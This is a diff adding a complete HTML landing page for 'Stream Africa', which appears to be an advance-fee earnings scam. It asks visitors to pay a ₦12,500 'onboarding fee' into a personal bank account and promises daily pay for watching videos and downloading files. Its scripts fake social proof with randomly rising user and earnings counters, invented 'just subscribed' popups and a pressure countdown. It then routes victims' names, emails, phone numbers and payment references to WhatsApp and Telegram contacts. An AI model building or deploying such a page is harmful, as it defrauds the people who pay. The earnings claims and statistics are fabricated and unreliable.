@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Stream Africa</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">
+<style>
+/* --- GENERAL STYLES --- */
+body{margin:0;font-family:Poppins,sans-serif;background:linear-gradient(135deg,#0B2F2C,#0F3D3A,#123F3B);color:white;overflow-x:hidden;}
+header{display:flex;justify-content:space-between;padding:20px 8%;align-items:center;}
+.logo{font-weight:700;font-size:22px;}
+.btn{background:#2ED3C6;padding:12px 25px;border-radius:30px;text-decoration:none;color:#000;font-weight:600;transition:0.3s;cursor:pointer;}
+.btn:hover{background:#1bc5b5;transform:scale(1.05);}
+section{padding:70px 8%;}
+h1,h2,h3{margin-bottom:15px;}
+.highlight{color:#2ED3C6;}
+.card{background:rgba(255,255,255,0.07);padding:25px;border-radius:20px;margin-bottom:20px;backdrop-filter:blur(10px);box-shadow:0 0 20px rgba(0,0,0,0.2);}
+.counter-box{display:flex;justify-content:space-between;flex-wrap:wrap;}
+.counter{flex:1;min-width:200px;text-align:center;margin:15px;}
+.counter h2{font-size:35px;color:#F4C542;}
+footer{text-align:center;padding:30px;background:#0B2F2C;}
+.popup{position:fixed;background:#0F3D3A;padding:15px 20px;border-radius:12px;box-shadow:0 0 15px rgba(0,0,0,0.4);font-size:14px;color:white;z-index:9999;max-width:300px;opacity:0;transition: all 0.5s ease-in-out;}
+.popup.show{opacity:1;}
+.popup.hide{opacity:0;}
+form{display:flex;flex-direction:column;}
+input,select,textarea{width:100%;margin:10px 0;padding:10px;border-radius:5px;border:none;}
+button{width:100%;padding:12px;margin-top:10px;border:none;border-radius:5px;background:#2ED3C6;color:#000;font-weight:bold;cursor:pointer;transition:0.3s;}
+button:hover{background:#1bc5b5;}
+.payment-box{margin-top:20px;padding:20px;background:rgba(255,255,255,0.08);border-radius:8px;}
+.account-details{margin-top:10px;font-size:15px;line-height:1.6;}
+.success-message{display:none;margin-top:20px;padding:15px;background:#065f46;border-radius:8px;text-align:center;}
+.support-buttons{margin-top:15px;}
+.support-buttons a{display:block;margin-top:10px;padding:10px;background:#2563eb;text-align:center;color:white;text-decoration:none;border-radius:5px;}
+#earnings{padding:40px 8%;background:rgba(255,255,255,0.05);border-radius:20px;margin:30px 8%;text-align:center;}
+#liveEarnings{font-size:40px;color:#F4C542;}
+.text-section{margin-bottom:30px;}
+.text-section p{line-height:1.6;}
+.timer-box{margin:10px 0;padding:10px;background:rgba(255,255,255,0.1);border-radius:5px;text-align:center;font-weight:bold;}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">Stream Africa</div>
+  <span class="btn" onclick="showSection('home')">Home</span>
+  <span class="btn" onclick="showSection('register')">Register</span>
+</header>
+
+<section id="home">
+<h1>Where <span class="highlight">Engagement</span> Meets Income</h1>
+<p>Turn your participation into earnings across multiple collaboration systems. Watch, interact, and get paid instantly!</p>
+<a class="btn" onclick="showSection('register')">Start Earning</a>
+
+<!-- EXPLANATIONS SECTION -->
+<div class="text-section">
+<h2>🚀 STREAM AFRICA MEMBERSHIP PRICING</h2>
+<p>🧾 <strong>Onboarding Fee:</strong> ₦12,500<br>
+<strong>Stream Cashback:</strong> ₦12,500 (100% returned instantly)<br>
+<strong>Partner Earnings:</strong> ₦16,200<br>
+Reconnect: ₦300 | Chain 1: ₦200 | Chain 2: ₦100</p>
+<p>💸 <strong>Daily Earnings:</strong><br>
+🎥 Livestream — ₦5,700<br>
+📹 Video — ₦2,750<br>
+🎧 Audio — ₦1,550<br>
+🖼️ Snap — ₦1,150<br>
+📂 File Download — ₦3,050</p>
+<p>🌐 <strong>Power Features:</strong><br>
+📲 TikTok Creators Network: Up to ₦200,000 monthly<br>
+🎁 WishHub: Win real gifts weekly<br>
+🛍️ Stream Bazaar: Sell products & services<br>
+🧠 Stream SkillUp: Learn high income digital skills</p>
+<p><strong>STREAM = Fast Recovery + Steady Income 2026+</strong><br>
+Not just a platform BUT a financial system.</p>
+</div>
+
+<div class="text-section">
+<h2>Mind-Blowing Testimony</h2>
+<p>See how my simple strategies made <strong>Tees Media</strong>, one of my mentees, move from making ₦500,000 monthly to ₦6,000,000 monthly with zero stress, zero anxiety, and zero panic. Just applying my simple codes and strategies… Tees Media is now a testimony!</p>
+</div>
+
+<div class="text-section">
+<h2>Why Stream Africa?</h2>
+<p>Ask yourself, if Stream Africa is not the best, why would the <strong>BIGGEST STREAMER IN AFRICA</strong> join? The opportunity you won't see somewhere else! Better join us now!</p>
+<p>The Stream Africa reward system is designed to be efficient, transparent, and sustainable. The best part? You don’t need to invite anyone to start earning.</p>
+</div>
+
+<h2>Live Platform Statistics</h2>
+<div class="counter-box">
+  <div class="counter"><h2 id="users">0</h2><p>Active Streamers</p></div>
+  <div class="counter"><h2 id="collabs">0</h2><p>Collaborations Completed</p></div>
+  <div class="counter"><h2 id="cashback">0</h2><p>Cashbacks Processed</p></div>
+</div>
+<section id="earnings">
+<h2>💸 Total Earnings by Streamers</h2>
+<h1 id="liveEarnings">$,000</h1>
+<p>Watch how quickly our community earns in real time!</p>
+</section>
+
+<h2>Collaboration Features</h2>
+
+<div class="card">
+<h3>🎧 Audio Collab — Where Listening Pays</h3>
+<p>Stream promoted music, interact with official sound projects, and earn $1.5 per qualified action. Each song contributes to the artist’s growth while giving you real cash rewards. Your ears are your assets, your time is income.</p>
+</div>
+
+<div class="card">
+<h3>🎬 Video Collab — Watch, Promote, Profit</h3>
+<p>Engage with official videos like trailers, promos, campaigns, and studio releases. Every view and interaction is tracked and paid at $2.7 per action. Help brands reach global audiences while you earn.</p>
+</div>
+
+<div class="card">
+<h3>🔴 Livestream Collab — Show Up. Engage. Earn</h3>
+<p>Participate in livestream sessions hosted by creators and studios. Co-streamers and active viewers also earn. Interact, comment, and support the session — your presence is now profitable.</p>
+</div>
+
+<div class="card">
+<h3>🖼 Snap Collab — Visuals Pay You</h3>
+<p>Engage with official artworks, posters, and campaign creatives. Every interaction gives $1.1 per action. Creativity and attention now translate into tangible earnings.</p>
+</div>
+
+<div class="card">
+<h3>📥 File Download — Download to Earn</h3>
+<p>Support creators by downloading official files like music, documents, and multimedia resources. Earn $1 per download while helping content owners expand reach. Even a simple click now works for you!</p>
+</div>
+
+<h2>Activation Fee</h2>
+<div class="card">
+<p><strong>Registration Fee:</strong> ₦12,500</p>
+<p><strong>Cashback:</strong> 100% immediately after registration</p>
+<p><strong>Bank Details:</strong></p>
+<p>Bank Name: OPay</p>
+<p>Account Name: CHIBUZOR MERCY</p>
+<p>Account Number: 6109473130</p>
+<a class="btn" onclick="showSection('register')">Register Now</a>
+</div>
+</section>
+
+<section id="register" style="display:none;">
+<h2>Register on Stream Africa</h2>
+<form onsubmit="showSection('payment'); return false;">
+<input type="text" placeholder="Full Name" required>
+<input type="email" placeholder="Email Address" required>
+<input type="tel" placeholder="Phone Number" required>
+<input type="password" placeholder="Create Password" required>
+<button type="submit">Register & Continue</button>
+</form>
+</section>
+
+<section id="payment" style="display:none;">
+<h2>Complete Your Payment</h2>
+<div class="payment-box">
+<div class="payment-box">
+<h3>Bank Transfer</h3>
+<div class="account-details">
+<strong>Account Name:</strong> OPay<br>
+<strong>Account Number:</strong> 6109473130<br>
+<strong>Bank Name:</strong> CHIBUZOR MERCY
+</div>
+<p>After completing transfer, click below to submit proof.</p>
+<button onclick="showSection('submit-proof')">I Have Made Payment</button>
+</div>
+</section>
+
+<section id="submit-proof" style="display:none;">
+<h2>Submit Payment Proof</h2>
+<form onsubmit="submitProof(event)">
+<input type="text" placeholder="Full Name" required>
+<input type="email" placeholder="Email Address" required>
+<input type="tel" placeholder="Phone Number" required>
+<select required>
+<option value="">Select Payment Method</option>
+<option>Paystack</option>
+<option>Bank Transfer</option>
+</select>
+<input type="text" placeholder="Transaction ID / Reference Number" required id="trackingID">
+<input type="file" required>
+<textarea placeholder="Additional Notes (Optional)"></textarea>
+
+<div class="timer-box">
+Countdown to submission: <span id="submitTimer">20:00</span>
+</div>
+
+<button type="submit">Submit & Continue</button>
+</form>
+
+<div class="success-message" id="successBox">
+✅ Your proof has been submitted successfully.<br>
+Redirecting you to our official support...
+<div class="support-buttons">
+<a href="#" id="openTelegram">Open Telegram Now</a>
+<a href="#" id="openWhatsApp">Contact WhatsApp Support</a>
+</div>
+</div>
+</section>
+
+<div id="popup-container"></div>
+
+<footer>
+© 2026 Stream Africa. All Rights Reserved.
+</footer>
+
+<script>
+function showSection(id){
+  const sections=['home','register','payment','submit-proof'];
+  sections.forEach(sec=>{document.getElementById(sec).style.display=(sec===id)?'block':'none';});
+  window.scrollTo(0,0);
+}
+
+/* --- CONTINUOUS COUNTERS --- */
+function animateValue(id,start,end,duration){
+  let range=end-start,current=start,increment=end>start?1:-1,stepTime=Math.abs(Math.floor(duration/range)),obj=document.getElementById(id);
+  let timer=setInterval(()=>{current+=increment;obj.innerHTML=current.toLocaleString();if(current===end)clearInterval(timer);},stepTime);
+}
+animateValue("users",0,5428,2000);
+animateValue("collabs",0,18934,2500);
+animateValue("cashback",0,3207,2200);
+
+let liveEarnings=50000;
+function updateLiveEarnings(){liveEarnings+=Math.floor(Math.random()*300+100);document.getElementById("liveEarnings").innerText=`$${liveEarnings.toLocaleString()}`;}
+setInterval(updateLiveEarnings,2000);
+
+/* --- LIVE POPUPS ALL POSITIONS --- */
+const liveMessages=[
+"Daniel A. just joined from Lagos",
+"Sarah M. completed Video Collab",
+"Michael T. received cashback",
+"New user verified",
+"Faith just joined from Nigeria",
+"Miracle just got verified",
+"David just joined from Ghana",
+"Hajara from Abuja just subscribed to STREAM 12,000",
+"MICHAEL from DELTA just subscribed to STREAM 12,000",
+"Elijah just subscribed to STREAM 12,000",
+"Marcus just subscribed to STREAM 12,000",
+"Aiden just subscribed to STREAM 12,000",
+"Sofia just subscribed to STREAM 12,000"
+];
+const positions=["users","collabs","cashback","top","left-side","right-side"];
+function createLivePopup(){
+  const msg=liveMessages[Math.floor(Math.random()*liveMessages.length)];
+  const pos=positions[Math.floor(Math.random()*positions.length)];
+  const popup=document.createElement("div");
+  popup.className="popup show";
+  popup.innerText=msg;
+  popup.style.position="fixed";popup.style.zIndex=9999;
+  switch(pos){
+    case "users":case "collabs":case "cashback":
+      const elem=document.getElementById(pos);
+      const rect=elem.getBoundingClientRect();
+      popup.style.left=rect.left+window.scrollX+"px";
+      popup.style.top=rect.top+window.scrollY-40+"px";
+      break;
+    case "top":popup.style.top="20px";popup.style.left="50%";popup.style.transform="translateX(-50%)";break;
+    case "left-side":popup.style.top=Math.floor(Math.random()*300+50)+"px";popup.style.left="10px";break;
+    case "right-side":popup.style.top=Math.floor(Math.random()*300+50)+"px";popup.style.right="10px";break;
+  }
+  document.body.appendChild(popup);
+  let floatPos=0;
+  const floatInterval=setInterval(()=>{
+    floatPos+=1;
+    if(pos.includes("side")) popup.style.top=parseInt(popup.style.top)-1+"px";
+    else if(pos==="top") popup.style.top=parseInt(popup.style.top)-0.5+"px";
+    else popup.style.top=rect.top+window.scrollY-40-floatPos+"px";
+    if(floatPos>=50) clearInterval(floatInterval);
+  },20);
+  setTimeout(()=>{popup.classList.remove("show");popup.classList.add("hide");setTimeout(()=>{popup.remove();},1000);},4000);
+}
+setInterval(createLivePopup,Math.floor(Math.random()*4000)+2000);
+
+/* --- CONTINUOUS COUNTER INCREMENTS --- */
+function incrementCounter(id,minInc=1,maxInc=5){
+  const elem=document.getElementById(id);let current=parseInt(elem.innerText.replace(/,/g,''))||0;current+=Math.floor(Math.random()*(maxInc-minInc+1))+minInc;elem.innerText=current.toLocaleString();
+}
+setInterval(()=>{incrementCounter("users");},2000);
+setInterval(()=>{incrementCounter("collabs");},2500);
+setInterval(()=>{incrementCounter("cashback");},2200);
+
+/* --- SUBMIT PROOF WITH TRACKING ID AND TIMER --- */
+let submitTime=20*60; // 20 minutes countdown
+function updateSubmitTimer(){
+  const minutes=Math.floor(submitTime/60).toString().padStart(2,'0');
+  const seconds=(submitTime%60).toString().padStart(2,'0');
+  document.getElementById("submitTimer").innerText=`${minutes}:${seconds}`;
+  if(submitTime>0) submitTime--;
+}
+setInterval(updateSubmitTimer,1000);
+
+function submitProof(event){
+  event.preventDefault();
+  const name=document.querySelector("#submit-proof input[type=text]").value;
+  const email=document.querySelector("#submit-proof input[type=email]").value;
+  const phone=document.querySelector("#submit-proof input[type=tel]").value;
+  const method=document.querySelector("#submit-proof select").value;
+  const transID=document.getElementById("trackingID").value;
+
+  // Pre-filled WhatsApp / Telegram messages
+  const message=`Hello, I have submitted my payment proof.\nName: ${name}\nEmail: ${email}\nPhone: ${phone}\nMethod: ${method}\nTransaction ID: ${transID}`;
+  document.getElementById("openWhatsApp").href=`https://wa.me/2347041807311?text=${encodeURIComponent(message)}`;
+  document.getElementById("openTelegram").href=`https://t.me/Official_landingpage_for_sites?text=${encodeURIComponent(message)}`;
+
+  document.querySelector("#submit-proof form").style.display="none";
+  document.getElementById("successBox").style.display="block";
+
+  setTimeout(()=>{window.location.href="https://t.me/Official_landingpage_for_sites";},5000);
+}
+</script>
+
+</body>
+</html>
